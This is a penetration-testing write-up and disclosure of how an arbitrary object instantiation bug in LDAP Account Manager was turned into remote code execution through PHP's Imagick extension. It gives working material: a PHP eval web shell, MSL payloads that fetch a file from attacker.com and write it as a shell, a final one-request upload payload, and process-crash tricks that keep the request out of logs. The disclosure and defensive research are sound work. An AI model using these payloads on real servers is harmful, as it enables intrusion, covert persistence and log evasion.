
##
#
https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/
#
##



Exploiting Arbitrary Object Instantiations in PHP without Custom Classes
Written by Arseniy Sharoglazov on July 14, 2022
Arseniy Sharoglazov
Penetration Testing Expert
_mohemiv

During an internal penetration test, I discovered an unauthenticated Arbitrary Object Instantiation vulnerability in LAM (LDAP Account Manager), a PHP application.

PHP’s Arbitrary Object Instantiation is a flaw in which an attacker can create arbitrary objects. This flaw can come in all shapes and sizes. In my case, the vulnerable code could have been shortened to one simple construction:

new $_GET['a']($_GET['b']);

That’s it. There was nothing else there, and I had zero custom classes to give me a code execution or a file upload. In this article, I explain how I was able to get a Remote Code Execution via this construction.
Discovering LDAP Account Manager

In the beginning of our internal penetration test I scanned the network for 636/tcp port (ssl/ldap), and I discovered an LDAP service:

$ nmap 10.0.0.1 -p80,443,389,636 -sC -sV -Pn -n
Nmap scan report for 10.0.0.1
Host is up (0.005s latency).

PORT STATE SERVICE VERSION
369/tcp closed ldap
443/tcp open ssl/http Apache/2.4.25 (Debian)
636/tcp open ssl/ldap OpenLDAP 2.2.X - 2.3.X
| ssl-cert: Subject: commonName=*.company.com
| Subject Alternative Name: DNS:*.company.com, DNS:company.com
| Not valid before: 2022-01-01T00:00:00
|_Not valid after: 2024-01-01T23:59:59
|_ssl-date: TLS randomness does not represent time

I tried to access this LDAP service via an anonymous session, but it failed:

$ ldapsearch -H ldaps://10.0.0.1:636/ -x -s base -b '' "(objectClass=*)" "*" +
ldap_sasl_bind(SIMPLE): Can't contact LDAP server (-1)

However, after I put the line “10.0.0.1 company.com” to my /etc/hosts file, I was able to connect to this LDAP and extract all publicly available data. This meant the server had a TLS SNI check, and I was able to bypass it using a hostname from the server’s certificate.

The domain “company.com” wasn’t the right domain name of the server, but it worked.

$ ldapsearch -H ldaps://company.com:636/ -x -s base -b '' "(objectClass=*)" "*" +
configContext: cn=config
namingContexts: dc=linux,dc=company,dc=com
…

$ ldapsearch -H ldaps://company.com:636/ -x -s sub -b 'dc=linux,dc=company,dc=com' "(objectClass=*)" "*" +
…
objectClass: person
objectClass: ldapPublicKey
sshPublicKey: ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAuZwGKsvsKlXhscOsIMUrwtFvoEgl
…

After extracting information, I discovered that almost every user record in the LDAP had the sshPublicKey property, containing the users’ SSH public keys. So, gaining access to this server would mean gaining access to the entire Linux infrastructure of this customer.

Since I wasn’t aware of any vulnerabilities in OpenLDAP, I decided to brute force the Apache server on port 443/tcp for any files and directories. There was only one directory:

[12:00:00] 301 -   344B   ->  /lam => https://10.0.0.1/lam/

And this is how I found the LAM system.
LDAP Account Manager

LDAP Account Manager (LAM) is a PHP web application for managing LDAP directories via a user-friendly web frontend. It’s one of the alternatives to FreeIPA.

I encountered the LAM 5.5 system:
The found /lam/ page redirected here

The default configuration of LAM allows any LDAP user to log in, but it might easily be changed to accept users from a specified administrative group only. Additional two-factor authentication, such as Yubico or TOTP, can be enforced as well.

The source code of LAM could be downloaded from its official GitHub page. LAM 5.5 was released in September 2016. The codebase of LAM 5.5 is quite poor compared to its newer versions, and this gave me some challenges.

In contrast to many web applications, LAM is not intended to be installed manually to a web server. LAM is included in Debian repositories and is usually installed from there or from deb/rpm packages. In such a setup, there should be no misconfigurations and no other software on the server.
Analyzing LDAP Account Manager

LAM 5.5 has a few scripts available for unauthenticated users.

I found an LDAP Injection, which was useless since the data were being injected into an anonymous LDAP session, and an Arbitrary Object Instantiation.

/lam/templates/help.php:

if (isset($_GET['module']) && !($_GET['module'] == 'main') && !($_GET['module'] == '')) {
    include_once(__DIR__ . "/../lib/modules.inc");
    if (isset($_GET['scope'])) {
        $helpEntry = getHelp($_GET['module'],$_GET['HelpNumber'],$_GET['scope']);
    }
    else {
        $helpEntry = getHelp($_GET['module'],$_GET['HelpNumber']);
    }
…

/lib/modules.inc:

function getHelp($module,$helpID,$scope='') {
    …
    $moduleObject = moduleCache::getModule($module, $scope);
    …

/lam/lib/account.inc:

public static function getModule($name, $scope) {
    …
    self::$cache[$name . ':' . $scope] = new $name($scope);
    …

Here, the value of $_GET['module'] gets to $name, and the value of $_GET['scope'] gets to $scope. After this, the construction new $name($scope) is executed.

So, whether I would access the entire Linux infrastructure of this customer has come to whether I will be able to exploit this construction to a Remote Code Execution or not.
Exploiting “new $a($b)” via Custom Classes or Autoloading

In the construction new $a($b), the variable $a stands for the class name that the object will be created for, and the variable $b stands for the first argument that will be passed to the object’s constructor.

If $a and $b come from GET/POST, they can be strings or string arrays. If they come from JSON or elsewhere, they might have other types, such as object or boolean.

Let’s consider the following example:

class App {
    function __construct ($cmd) {
        system($cmd);
    }
}

# Additionally, in PHP < 8.0 a constructor might be defined using the name of the class
class App2 {
    function App2 ($cmd) {
        system($cmd);
    }
}

# Vulnerable code
$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);

In this code, you can set  $a  to  App  or  App2  and  $b  to  uname -a. After this, the command  uname -a  will be executed.

When there are no such exploitable classes in your application, or you have the class needed in a separate file that isn’t included by the vulnerable code, you may take a look at autoloading functions.

Autoloading functions are set by registering callbacks via spl_autoload_register or by defining __autoload. They are called when an instance of an unknown class is trying to be created.


# An example of an autoloading function
spl_autoload_register(function ($class_name) {
        include './../classes/' . $class_name . '.php';
});

# An example of an autoloading function, works only in PHP < 8.0
function __autoload($class_name) {
        include $class_name . '.php';
};

# Calling spl_autoload_register with no arguments enables the default autoloading function, which includes lowercase($classname) + .php/.inc from include_path
spl_autoload_register();

Depending on the PHP version, and the code in the autoloading functions, some ways to get a Remote Code Execution via autoloading might exist.

In LAM 5.5, I wasn’t able to find any useful custom class, and I didn’t have autoloading either.
Exploiting “new $a($b)” via Built-In Classes

When you don’t have custom classes and autoloading, you can rely on built-in PHP classes only.

There are from 100 to 200 built-in PHP classes. The number of them depends on the PHP version and the extensions installed. All of built-in classes can be listed via the get_declared_classes function, together with the custom classes:

var_dump(get_declared_classes());

Classes with useful constructors can be found via the reflection API.
Displaying constructors and their parameters using the reflation API: https://3v4l.org/2JEGF

If you control multiple constructor parameters and can call arbitrary methods afterwards, there are many ways to get a Remote Code Execution. But if you can pass only one parameter and don’t have any calls to the created object, there is almost nothing.

I know of only three ways to get something from new $a($b).
Exploiting SSRF + Phar deserialization

The SplFileObject class implements a constructor that allows connection to any local or remote URL:

new SplFileObject('http://attacker.com/');

This allows SSRF. Additionally, SSRFs in PHP < 8.0 could be turned into deserializations via techniques with the Phar protocol.

I didn’t need SSRF because I had access to the local network. And, I wasn’t able to find any POP-chain in LAM 5.5, so I didn’t even consider exploiting deserialization via Phar.
Exploiting PDOs

The PDO class has another interesting constructor:

new PDO("sqlite:/tmp/test.txt")

The PDO constructor accepts DSN strings, allowing us to connect to any local or remote database using installed database extensions. For example, the SQLite extension can create empty files.

When I tested this on my target server, I discovered that it didn’t have any PDO extensions. Neither SQLite, MySQL, ODBC, and so on.
SoapClient/SimpleXMLElement XXE

In PHP ≤ 5.3.22 and ≤ 5.4.12, the constructor of SoapClient was vulnerable to XXE. The constructor of SimpleXMLElement was vulnerable to XXE as well, but it required libxml2 < 2.9.
Discovering New Ways to Exploit “new $a($b)”

To discover new ways to exploit new $a($b), I decided to expand the surface of attack. I started with figuring out which PHP versions LAM 5.5 supports, as well as what PHP extensions it uses.

Since LAM is distributed via deb/rpm packages, it contains a configuration file with all its requirements and dependents:

Package: ldap-account-manager
Architecture: all
Depends: php5 (>= 5.4.26) | php (>= 21), php5-ldap | php-ldap, php5-gd | php-gd, php5-json | php-json , php5-imagick | php-imagick, apache2 | httpd, debconf (>= 0.2.26) | debconf-2.0, ${misc:Depends}
Recommends: php-apc
Suggests: ldap-server, php5-mcrypt, ldap-account-manager-lamdaemon, perl
...

Contents of the configuration file for deb packages (see on GitHub)

LAM 5.5 requires PHP ≥ 5.4.26, and LDAP, GD, JSON, and Imagick extensions.

Imagick is infamous for remote code execution vulnerabilities, such as ImageTragick and others. That’s where I decided to continue my research.
The Imagick Extension

The Imagick extension implements multiple classes, including the class Imagick. Its constructor has only one parameter, which can be a string or a string array:
Imagick documentation: https://www.php.net/manual/en/imagick.construct.php

I tested whether  Imagick::__construct  accepts remote schemes and can connect to my host via HTTP:
Creating arbitrary Imagick instances in LAM 5.5
Receiving a connection from LAM 5.5

I discovered that the Imagick class exists on the target server, and executing  new Imagick(...) is enough to coerce the server to connect to my host. However, it wasn’t clear whether creating an Imagick instance is enough to trigger any vulnerabilities in ImageMagick.

I tried to send publicly available POCs to the server, but they all failed. After that, I decided to make it easy, and I asked for advice in one of the application security communities.

Luckily for me, Emil Lerner came to help. He said that if I could pass values such as “epsi:/local/path” or “msl:/local/path” to ImageMagick, it would use their scheme part, e.g., epsi or msl, to determine the file format.
Exploring the MSL Format

The most interesting ImageMagick format is MSL.

MSL stands for Magick Scripting Language. It’s a built-in ImageMagick language that facilitates the reading of images, performance of image processing tasks, and writing of results back to the filesystem.

I tested whether new Imagick(...) allows msl: scheme:
Including an msl file via new Imagick(…)
Starting an HTTP server to serve files to be copied via MSL

The MSL scheme worked on the latest versions of PHP, Imagick, and ImageMagick!

Unfortunately, URLs like msl:http://attacker.com/ aren’t supported, and I needed to upload files to the server to make msl: work.

In LAM, there are no scripts that allow unauthenticated uploads, and I didn’t think that a technique with PHP_SESSION_UPLOAD_PROGRESS would help because I needed a well-formed XML file for MSL.
Imagick’s Path Parsing

Imagick supports not only its own URL schemes but also PHP schemes (such as “php://”, “zlib://”, etc). I decided to find out how it works.

Here is what I discovered.
A null-byte still works

An Imagick argument is truncated by a null-byte, even when it contains a PHP scheme:

# No errors
$a = new Imagick("/tmp/positive.png\x00.jpg");

# No errors
$a = new Imagick("http://attacker.com/test\x00test");

Square brackets can be used to detect ImageMagick

ImageMagick is capable of reading options, e.g., an image’s size or frame numbers, from square brackets from the end of the file path:

# No errors
$a = new Imagick("/tmp/positive.png[10x10]");

# No errors
$a = new Imagick("/tmp/positive.png[10x10]\x00.jpg");

This might be used to determine whether you control input into the ImageMagick library.
“https://” goes to PHP, but “https:/” goes to curl

ImageMagick supports more than 100 different schemes.

Half of ImageMagick’s schemes are mapped to external programs. This mapping can be viewed using the convert -list delegate command:
Output of convert -list delegate

By observing the convert -list delegate output, it’s possible to discover that both PHP and ImageMagick support HTTPS schemes.

Furthermore, passing the “https:/” string to new Imagick(...) bypasses PHP’s HTTPS client and invokes a curl process:
Invoking a curl process via new Imagick(…)

This also overcomes the TLS certificate check, because the -k flag is used. This flushes the server’s output to /tmp/*.dat file, which can be found by brute forcing /proc/[pid]/fd/[fd] filenames when the process is active.

I wasn’t able to receive a connection using the “https:/” scheme from the target server, probably because there was no curl.
PHP’s arrays can be used to enumerate files

When I discovered the curl technique with flushing the request data to /tmp/*.dat, and brute forcing /proc/[pid]/fd/[fd], I tested whether new Imagick('http://...') flushes data as well. It does!

I tested whether I could temporarily make an MSL content appear in /proc/[pid]/fd/[fd] of one of the Apache worker process, and access it subsequently from another one.

Since new Imagick(...) allows string arrays and stops processing entities after the first error, I was able to enumerate PIDs on the server and discover all PIDs of the Apache workers I can read file descriptors from:
Discovering all PIDs of the Apache worker processes I can read file descriptors from
Getting connections from ImageMagick that show PIDs I can read file descriptors from

I discovered that due to some hardening in Debian, I can access only the Apache worker process I execute code in and no others. However, this technique worked locally on my Arch Linux.
RCE #1: PHP Crash + Brute Force

After testing multiple ways to include a file from a file descriptor, I discovered that text:fd:30 and similar constructions case a worker process to crash on the remote web server:
The worker process will be restarted shortly by the parent Apache process

This is what made it initially possible to upload a web shell!

The idea was to create multiple PHP temporary files with our content using multipart/form-data requests. According to the default max_file_uploads value, any client can send up to 20 files in a multipart request, which will be saved to /tmp/phpXXXXXX paths, where X ∈ [A-Za-z0-9]. These files will never be deleted if we cause the worker that creates them to crash.

If we send 20,000 such multipart requests containing 20 files each, it will result in the creation of 400,000 temporary files.

20,000 × 20 = 400,000
(26+26+10)6 / 400,000 = 142,000
P(A) = 1 – (1 – 400,000/(26+26+10)6)142,000 ≈ 0.6321

So, in a 63.21% chance, after 142,000 tries we will be able to guess at least one temporary name and include our file with the MSL content.

👉 Sending more than 20,000 initial requests wouldn’t speed up the process. Any request that causes a crash is quite slow and takes more than a second. What’s more, the creation of more than 400,000 files may create unexpected overhead on the filesystem.

Let’s construct this multipart request!

First, we need to create an image with a web shell, since MSL allows only images to work with:

convert xc:red -set 'Copyright' '<?php @eval(@$_REQUEST["a"]); ?>' positive.png

Second, let’s create an MSL file that will copy this image from our HTTP server to a writable web directory. It wasn’t hard to find such a directory in configuration files of LAM.

<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="http://attacker.com/positive.png" />
<write filename="/var/lib/ldap-account-manager/tmp/positive.php" />
</image>

And third, let’s put it all together in Burp Suite Intruder:
Configuring Burp Suite Intruder

To make the attack smooth, I set the PHPSESSID cookie to prevent the creation of multiple session files (not to be confused with temporary upload files) and specified the direct IP of the server since it turned out that we had a balancer on 10.0.0.1 that was directing requests to different data centers.

Additionally, I enabled the denial-of-service mode in Burp Intruder to prevent descriptor exhaustion of Burp Suite, which might happen because of incorrect TCP handling on the server side.

After all 20,000 multipart requests were sent, I brute forced the /tmp/phpXXXXXX files via Burp Intruder:
Bruteforcing /tmp/phpXXXXXX files

There is nothing to see there; all the server responses stayed the same. However, after 120,000 tries, our web shell was uploaded!
Executing the “id” command on the target server

After this, we got administrative access to OpenLDAP, and took control over all Linux servers of this customer with the maximum privileges!
RCE #2: VID Scheme

I tried to reproduce the technique with text:fd:30 locally, and I discovered that this construction no longer crashes ImageMagick. I went deep to ImageMagick sources to find a new crash, and I found something much better.

Here is my discovery.

Let’s look into the function ReadVIDImage, which is used for parsing VID schemes:
A source code of ReadVIDImage (see on GitHub)

This function calls ExpandFilenames. The description of ExpandFilenames explains in details everything this function does.
The description for the ExpandFilenames function (see on GitHub)

The call of ExpandFilenames means that the VID scheme accepts masks, and constructs filepaths using them.

Therefore, by using the vid: scheme, we can include our temporary file with the MSL content without knowing its name:
Including an MSL file without knowing its name

After this, I discovered quite interesting caption: and info: schemes. The combination of both allows to eliminate an out-of-band connection, and create a web shell in one fell swoop:
Uploading a web shell via caption: and info: schemes
Getting content of the uploaded /var/lib/ldap-account-manager/tmp/positive.php file

This is how we were able to exploit this Arbitrary Object Instantiation in one request, and without any of the application’s classes!
The Final Payload

Here is the final payload for exploiting Arbitrary Object Instantiations:

Class Name: Imagick
Argument Value: vid:msl:/tmp/php*

-- Request Data --
Content-Type: multipart/form-data; boundary=ABC
Content-Length: ...
Connection: close
 
--ABC
Content-Disposition: form-data; name="swarm"; filename="swarm.msl"
Content-Type: text/plain
 
<?xml version="1.0" encoding="UTF-8"?>
<image>
 <read filename="caption:&lt;?php @eval(@$_REQUEST['a']); ?&gt;" />
 <!-- Relative paths such as info:./../../uploads/swarm.php can be used as well -->
 <write filename="info:/var/www/swarm.php" />
</image>
--ABC--

It should work on every system on which the Imagick extension is installed, and it can be used in deserializations if you find a suitable gadget.

When the PHP runtime is libapache2-mod-php, you can prevent logging of this request by uploading a web shell and crashing the process at the same time:

Argument Value: ["vid:msl:/tmp/php*", "text:fd:30"]

Since the construction text:fd:30 doesn’t work on the latest ImageMagick, here is another one:

Crash Construction: str_repeat("vid:", 400)

This one works on every ImageMagick below 7.1.0-40 (released on July 4, 2022).

In installations like Nginx + PHP-FPM, the request wouldn’t disappear from Nginx’s logs, but it should not be written to PHP-FPM logs.
Afterword

Our team would like to say thank you to Roland Gruber, the developer of LAM, for the quick response and the patch, and to all researchers who previously looked at ImageMagick and shared their findings.

Timeline:

    16 June, 2022 — Reported to Roland Gruber
    16 June, 2022 — Initial reply from Roland Gruber
    27 June, 2022 — LAM 8.0 is released
    27 June, 2022 — CVE-2022-31084, CVE-2022-31085, CVE-2022-31086, CVE-2022-31087, CVE-2022-31088 are issued
    29 June, 2022 — LAM 8.0.1 is released, additional hardening has been done
    05 July, 2022 — Debian packages are updated
    14 July, 2022 — Public disclosure

Additionally, in case of exploitation of Arbitrary Object Instantiations with an injection to a constructor with two parameters, there is a public vector for this (in Russian). If you have three, four, or five parameters, you can use the SimpleXMLElement class and enable external entities.

Feel free to comment on this article on our Twitter. Follow @ptswarm or @_mohemiv so you don’t miss our future research and other publications.
